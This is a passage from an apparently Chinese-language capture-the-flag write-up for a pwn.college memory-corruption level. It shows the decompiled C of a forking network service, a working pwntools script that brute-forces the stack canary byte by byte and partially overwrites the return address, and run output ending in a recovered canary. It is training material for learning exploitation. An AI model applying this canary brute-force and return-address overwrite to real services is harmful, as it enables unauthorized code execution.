class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(\&quot;above\&quot; it in the stack are other local variables used by the function).&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your input will be read into this buffer.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The buffer is %d bytes long, but the program will let you provide an arbitrarily\n&quot;</span>, <span class="hljs-number">117LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;large input length, and thus overflow the buffer.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this level, there is no \&quot;win\&quot; variable.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You will need to force the program to execute the win_authed() function&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;by directly overflowing into the stored return address back to main,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;which is stored at %p, %d bytes after the start of your input buffer.\n&quot;</span>,<br>    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)rp_,<br>    rp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;That means that you will need to input at least %d bytes (%d to fill the buffer,\n&quot;</span>,<br>    rp_ - (_QWORD)buf + <span class="hljs-number">8</span>,<br>    <span class="hljs-number">117LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d to fill other stuff stored between the buffer and the return address,\n&quot;</span>, rp_ - (_QWORD)buf - <span class="hljs-number">117</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;and 8 that will overwrite the return address).\n&quot;</span>);<br>  cp_ = bp_;<br>  cv_ = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">while</span> ( *(_QWORD *)cp_ != cv_ )<br>    cp_ -= <span class="hljs-number">8LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;While canaries are enabled, this networked program forks.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What is important to note is that the canary does not get re-randomized on fork.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;When data that you are overflowing into is critical (i.e., if you screw it up&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the program crashes), but also static across executions, you can brute-force&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;it byte by byte over many attempts.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So, let&#x27;s brute-force the canary!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If this is your first time running this program, all you know so far is that&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the canary has a 0 as its left-most byte.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You should proceed like this:\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;- First, you should try overflowing just the null byte of the canary, for&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  practice. The canary starts at %p, which is %d bytes after the\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)cp_, cp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  start of your buffer. Thus, you should provide %d characters followed\n&quot;</span>, cp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  by a NULL byte, make sure the canary check passes, then try a non-NULL&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  byte and make sure the canary check fails. This will confirm the offsets.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;- Next try each possible value for just the next byte. One of them (the same&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  as whatever was there in memory already) will keep the canary intact, and&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  when the canary check succeeds, you know you have found the correct one.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;- Go on to the next byte, leak it the same way, and so on, until you have&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  the whole canary.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You will likely want to script this process! Each byte might take up to 256&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tries to guess..\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Because the binary is position independent, you cannot know&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exactly where the win_authed() function is located.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This means that it is not clear what should be written into the return address.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have chosen to send %lu bytes of input!\n&quot;</span>, nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will allow you to write from %p (the start of the input buffer)\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n&quot;</span>,<br>    (<span class="hljs-keyword">char</span> *)buf + nbytes,<br>    nbytes - <span class="hljs-number">117</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Of these, you will overwrite %d bytes into the return address.\n&quot;</span>, (<span class="hljs-keyword">char</span> *)buf + nbytes - rp_);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If that number is greater than 8, you will overwrite the entire return address.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwriting the entire return address is fine when we know&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the whole address, but here, we only really know the last three nibbles.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;These nibbles never change, because pages are aligned to 0x1000.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This gives us a workaround: we can overwrite the least significant byte&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;of the saved return address, which we can know from debugging the binary,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;to retarget the return to main to any instruction that shares the other 7 bytes.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Since that last byte will be constant between executions (due to page alignment),&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this will always work.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If the address we want to redirect execution to is a bit farther away from&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the saved return address, and we need to write two bytes, then one of those&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nibbles (the fourth least-significant one) will be a guess, and it will be&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;incorrect 15 of 16 times.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is okay: we can just run our exploit a few&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;times until it works (statistically, after 8 times or so).&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;One caveat in this challenge is that the win_authed() function must first auth:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;it only lets you win if you provide it with the argument 0x1337.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Speifically, the win_authed() function looks something like:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    void win_authed(int token)&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    &#123;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      if (token != 0x1337) return;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      puts(\&quot;You win! Here is your flag: \&quot;);&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      sendfile(1, open(\&quot;/flag\&quot;, 0), 0, 256);&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;      puts(\&quot;\&quot;);&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    &#125;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(byte_4393);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So how do you pass the check? There *is* a way, and we will cover it later,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;but for now, we will simply bypass it! You can overwrite the return address&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;with *any* value (as long as it points to executable code), not just the start&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;of functions. Let&#x27;s overwrite past the token check in win!\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To do this, we will need to analyze the program with objdump, identify where&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the check is in the win_authed() function, find the address right after the check,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;and write that address over the saved return address.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Go ahead and find this address now. When you&#x27;re ready, input a buffer overflow&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;that will overwrite the saved return address (at %p, %d bytes into the buffer)\n&quot;</span>,<br>    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)rp_,<br>    rp_ - (_QWORD)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;with the correct value.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, nbytes);<br>  v8 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 = __errno_location();<br>    v4 = strerror(*v3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v4);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You sent %d bytes!\n&quot;</span>, v8);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s see what happened with the stack:\n&quot;</span>);<br>  DUMP_STACK(sp_, sz_);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The program&#x27;s memory status:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the input buffer starts at %p\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the saved frame pointer (of main) is at %p\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)bp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the saved return address (previously to main) is at %p\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)rp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the saved return address is now pointing to %p.\n&quot;</span>, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)rp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the canary is stored at %p.\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)cp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the canary value is now %p.\n&quot;</span>, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)cp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the address of win_authed() is %p.\n&quot;</span>, win_authed);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you have managed to overwrite the return address with the correct value,&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;challenge() will jump straight to win_authed() when it returns.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s try it now!\n\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)buf + (<span class="hljs-keyword">int</span>)v8 &gt; rp_ + <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WARNING: You sent in too much data, and overwrote more than two bytes of the address.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         This can still work, because I told you the correct address to use for&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         this execution, but you should not rely on that information.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         You can solve this challenge by only overwriting two bytes!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         &quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><span class="hljs-comment">// 去掉 printf </span><br><span class="hljs-function">__int64 __fastcall <span class="hljs-title">challenge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v4; <span class="hljs-comment">// rax</span><br>  _QWORD v6[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+1Ch] [rbp-A4h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+2Ch] [rbp-94h]</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+30h] [rbp-90h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-88h]</span><br>  __int64 v11[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+B0h] [rbp-10h]</span><br>  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+B4h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+B8h] [rbp-8h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+C0h] [rbp+0h] BYREF</span><br>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [rsp+C8h] [rbp+8h] BYREF</span><br><br>  v7 = a1;<br>  v6[<span class="hljs-number">2</span>] = a2;<br>  v6[<span class="hljs-number">1</span>] = a3;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v11));<br>  v12 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">0</span>;<br>  buf = v11;<br>  nbytes = <span class="hljs-number">0LL</span>;<br>  sp_ = (__int64)v6;<br>  bp_ = (__int64)&amp;savedregs;<br>  sz_ = ((<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">char</span> *)&amp;savedregs - (<span class="hljs-keyword">char</span> *)v6) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">2</span>;<br>  rp_ = (__int64)&amp;retaddr;<br>  DUMP_STACK(sp_, sz_);<br>  cp_ = bp_;<br>  cv_ = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">while</span> ( *(_QWORD *)cp_ != cv_ )<br>    cp_ -= <span class="hljs-number">8LL</span>;<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;nbytes);<br>  v8 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 = __errno_location();<br>    v4 = strerror(*v3);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  DUMP_STACK(sp_, sz_);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> optval; <span class="hljs-comment">// [rsp+24h] [rbp-101Ch] BYREF</span><br>  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [rsp+28h] [rbp-1018h]</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+2Ch] [rbp-1014h]</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">addr</span>;</span> <span class="hljs-comment">// [rsp+30h] [rbp-1010h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+1038h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( argc &lt;= <span class="hljs-number">0</span> )<br>    __assert_fail(<span class="hljs-string">&quot;argc &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0xFB</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;###&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;### Welcome to %s!\n&quot;</span>, *argv);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;###&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1uLL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;unlimited connections.\n&quot;</span>);<br>  fd = socket(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  optval = <span class="hljs-number">1</span>;<br>  setsockopt(fd, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, &amp;optval, <span class="hljs-number">4u</span>);<br>  addr.sa_family = <span class="hljs-number">2</span>;<br>  *(_DWORD *)&amp;addr.sa_data[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>  *(_WORD *)addr.sa_data = htons(<span class="hljs-number">0x539</span>u);<br>  bind(fd, &amp;addr, <span class="hljs-number">0x10</span>u);<br>  listen(fd, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v7 = accept(fd, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Connection accepted!&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !fork() )<br>      <span class="hljs-keyword">break</span>;<br>    wait(<span class="hljs-number">0LL</span>);<br>  &#125;<br>  dup2(v7, <span class="hljs-number">0</span>);<br>  dup2(v7, <span class="hljs-number">1</span>);<br>  dup2(v7, <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> challenge((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)argc, argv, envp);<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>题目：网络程序 fork+Canary 泄露+pie 3 nibble。这里重点是使用多进程爆破 Canary 的过程<ul>
<li>逐字节爆破，第一个字节一定是 0，从第二个字节开始需要爆破尝试，如果错误会导致 smashing，如果正确加入到候选 Canary，直到 8 字节全爆破出结果</li>
</ul>
</li>
<li>由于跑脚本的时候会多次 fork ，可能会导致程序卡住，这会很蛋疼，因为每个字节 256 可能，recv time 为 1 的话要等好长时间才能爆破完，这时候如果卡住了又要重来</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>host = <span class="hljs-string">&#x27;localhost&#x27;</span>  <br>port = <span class="hljs-number">1337</span>  <br><br><span class="hljs-comment"># 连接到服务</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>():</span><br>    <span class="hljs-keyword">return</span> remote(host, port)<br><br><span class="hljs-comment"># 尝试一个字节，看看程序是否崩溃</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_byte</span>(<span class="hljs-params">p, payload</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>    p.send(payload)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = p.recvall(timeout=<span class="hljs-number">0.5</span>)<span class="hljs-comment"># not recv but recvall!</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smash&#x27;</span> <span class="hljs-keyword">in</span> response :<span class="hljs-comment"># timeout can be smaller </span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> EOFError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 爆破金丝雀</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_force_canary</span>():</span><br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span>  <span class="hljs-comment"># 已知最高位字节是0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>        found = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            p = connect()<br>            payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">120</span> + canary + <span class="hljs-built_in">bytes</span>([byte])<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-keyword">if</span> try_byte(p, payload):<br>                canary += <span class="hljs-built_in">bytes</span>([byte])<br>                found = <span class="hljs-literal">True</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">bytes</span>([byte]).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>                p.close()<br>                <span class="hljs-keyword">break</span><br>            p.close()<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># 主攻击逻辑</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    s = process(<span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>)<br>    canary = brute_force_canary()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found canary: <span class="hljs-subst">&#123;canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = connect()<br>        <span class="hljs-comment"># 发送正确的payload，包括金丝雀和覆盖返回地址</span><br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">120</span> + canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span><br>        payload += p16(<span class="hljs-number">0x1F96</span>)  <br>        <span class="hljs-built_in">print</span>(payload)<br>        p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>        p.send(payload)<br>       <br>        re = p.recvall(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(re)<br>        <span class="hljs-keyword">if</span> re.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(re)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment">#finally:</span><br>        p.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coq">Found byte <span class="hljs-number">7</span>: f2<br>Found canary: <span class="hljs-number">00</span>d92d0a018e2bf2<br>[◐] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying ::Opening connection to localhost on port <span class="hljs-number">1337</span>: Tryin[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xd9-\n\x01\x8e+\xf2BBBBBBBB\x96\x1f&#x27;<br>[+] Receiving all data: Done (<span class="hljs-number">5.46</span>KB)<br>[*] Closed connection to localhost port <span class="hljs-number">1337</span><br>b&#x27;You have chosen to send <span class="hljs-number">138</span> bytes of input!\nThis will allow you to write from <span class="hljs-number">0x7ffda0d6dd90</span> (the start of the input buffer)\nright up to (but not including) <span class="hljs-number">0x7ffda0d6de1a</span> (which is <span class="hljs-number">21</span> bytes beyond the <span class="hljs-keyword">end</span> of the buffer).\nOf these, you will overwrite <span class="hljs-number">2</span> bytes into the <span class="hljs-keyword">return</span> address.\nIf that number is greater than <span class="hljs-number">8</span>, you will overwrite the entire <span class="hljs-keyword">return</span> address.\n\nOverwriting the entire <span class="hljs-keyword">return</span> address is fine when we know\nthe whole address, but here, we only really know the last three nibbles.\nThese nibbles never <span class="hljs-built_in">change</span>, because pages are aligned to <span class="hljs-number">0x1000</span>.\nThis gives us a 